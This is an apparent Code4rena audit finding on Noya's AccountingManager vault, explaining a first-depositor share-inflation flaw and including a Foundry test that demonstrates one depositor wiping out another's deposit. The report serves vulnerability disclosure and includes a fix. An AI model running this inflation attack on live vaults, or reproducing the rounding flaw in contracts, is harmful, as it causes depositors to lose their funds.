# [M] First depositor can make subsequent depositor lose all of her or his deposit

## Summary
Severity: Medium
Chain: Smart contract
Component: 2024-04-noya
Published: 2024-05-17
Source: https://github.com/code-423n4/2024-04-noya-findings/issues/1473
Type: code-finding

## Details
# Lines of code

https://github.com/code-423n4/2024-04-noya/blob/cc3854f634a72bd4a8b597021887088ca2d6d29f/contracts/accountingManager/AccountingManager.sol#L226-L250
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol#L151-L153
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol#L225-L227
https://github.com/code-423n4/2024-04-noya/blob/cc3854f634a72bd4a8b597021887088ca2d6d29f/contracts/accountingManager/AccountingManager.sol#L591-L593
https://github.com/code-423n4/2024-04-noya/blob/cc3854f634a72bd4a8b597021887088ca2d6d29f/contracts/accountingManager/AccountingManager.sol#L627-L630


# Vulnerability details

## Impact
For calculating the `shares` for the corresponding deposit, the following `calculateDepositShares` function call the `previewDeposit` function below, which further calls the `_convertToShares`, `totalAssets`, and `TVL` functions below. Higher `baseToken.balanceOf(address(this))` causes the values returned by the `TVL` and `totalAssets` functions to be higher and the calculated `shares` to be lower for the same deposit amount. Thus, the first depositor can deposit just 1 wei of `baseToken` and then transfer a huge amount of `baseToken` to the `AccountingManager` contract after the `shares` are calculated for her or his deposit. Afterwards, the `shares` calculated for the subsequent depositor's deposit can round down to 0. In this case, the first depositor can later withdraw all of her or his deposit and transferred amount but the subsequent depositor cannot withdraw any of her or his deposit since she or he owns 0 shares. As a result, the subsequent depositor loses all of her or his deposit.

https://github.com/code-423n4/2024-04-noya/blob/cc3854f634a72bd4a8b597021887088ca2d6d29f/contracts/accountingManager/AccountingManager.sol#L226-L250
```solidity
    function calculateDepositShares(uint256 maxIterations) public onlyManager nonReentrant whenNotPaused {
        uint256 middleTemp = depositQueue.middle;
        uint64 i = 0;

        uint256 oldestUpdateTime = TVLHelper.getLatestUpdateTime(vaultId, registry);

        while (
            depositQueue.last > middleTemp && depositQueue.queue[middleTemp].recordTime <= oldestUpdateTime
                && i < maxIterations
        ) {
            i += 1;
            DepositRequest storage data = depositQueue.queue[middleTemp];

            uint256 shares = previewDeposit(data.amount);
            data.shares = shares;
            data.calculationTime = block.timestamp;
            ...

            middleTemp += 1;
        }

        depositQueue.middle = middleTemp;
    }
```

https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol#L151-L153
```solidity
    function previewDeposit(uint256 assets) public view virtual returns (uint256) {
        return _convertToShares(assets, Math.Rounding.Floor);
    }
```

https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol#L225-L227
```solidity
    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
        return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
    }
```

https://github.com/code-423n4/2024-04-noya/blob/cc3854f634a72bd4a8b597021887088ca2d6d29f/contracts/accountingManager/AccountingManager.sol#L591-L593
```solidity
    function totalAssets() public view override returns (uint256) {
        return TVL();
    }
```

https://github.com/code-423n4/2024-04-noya/blob/cc3854f634a72bd4a8b597021887088ca2d6d29f/contracts/accountingManager/AccountingManager.sol#L627-L630
```solidity
    function TVL() public view returns (uint256) {
        return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
            - depositQueue.totalAWFDeposit;
    }
```

## Proof of Concept
Please add the following test in `testFoundry\TestAccounting.sol`. This test will pass to demonstrate the described scenario.

```solidity
    function test_firstDepositorCanMakeSubsequentDepositorLoseDeposit() public {
        uint256 _amount = 10_000 * 1e6;

        _dealWhale(baseToken, address(alice), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 10 * _amount);
        _dealWhale(baseToken, address(bob), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 10 * _amount);

        uint256 initialUSDCAlice = IERC20(USDC).balanceOf(address(alice));
        uint256 initialUSDCBob = IERC20(USDC).balanceOf(address(bob));

        vm.prank(alice);
        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), _amount);

        vm.prank(bob);
        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), _amount);

        vm.prank(alice);

        // Alice deposits only 1 wei USDC
        accountingManager.deposit(address(alice), 1, address(0));

        vm.prank(owner);
        accountingManager.calculateDepositShares(10);

        vm.prank(alice);

        // after shares are calculated for Alice's deposit, she transfers _amount USDC directly to accountingManager
        IERC20(USDC).transfer(address(accountingManager), _amount);

        vm.prank(bob);

        // Bob then deposits _amount USDC
        accountingManager.deposit(address(bob), _amount, address(0));

        vm.prank(owner);
        accountingManager.calculateDepositShares(10);

        vm.warp(block.timestamp + 70 minutes);

        vm.prank(owner);
        accountingManager.executeDeposit(10, connector, "");

        // after Alice and Bob's deposits are executed, Alice owns 1 share
        //   but Bob owns no shares at all even he has deposited _amount USDC
        assertEq(accountingManager.balanceOf(address(alice)), 1);
        assertEq(accountingManager.balanceOf(address(bob)), 0);

        vm.startPrank(bob);

        // Bob cannot withdraw even 1 share
        vm.expectRevert();
        accountingManager.withdraw(1, address(bob));

        vm.startPrank(alice);

        // Alice can withdraw all of her shares
        accountingManager.withdraw(accountingManager.balanceOf(address(alice)), address(alice));

        vm.startPrank(owner);
        accountingManager.calculateWithdrawShares(10);

        vm.warp(block.timestamp + 6 hours + 5 minutes);

        accountingManager.startCurrentWithdrawGroup();

        bytes memory data = hex"1232";
        RetrieveData[] memory retrieveData = new RetrieveData[](1);
        retrieveData[0] = RetrieveData(1, address(connector), abi.encode(1, data));
        accountingManager.retrieveTokensForWithdraw(retrieveData);

        accountingManager.fulfillCurrentWithdrawGroup();

        accountingManager.executeWithdraw(10);

        vm.stopPrank();

        // after executing existing withdrawal, Alice receives all of her deposit and transferred amount
        assertEq(IERC20(USDC).balanceOf(address(alice)), initialUSDCAlice);

        // but Bob cannot receive any of his deposit back
        assertEq(initialUSDCBob - IERC20(USDC).balanceOf(address(bob)), _amount);
    }
```

## Tools Used
Manual Review

## Recommended Mitigation Steps
Certain amount of shares can be minted to `address(0)` during the deployment of the `AccountingManager` contract, and the first depositor can be required to mint a minimal amount of shares.


## Assessed type

Other
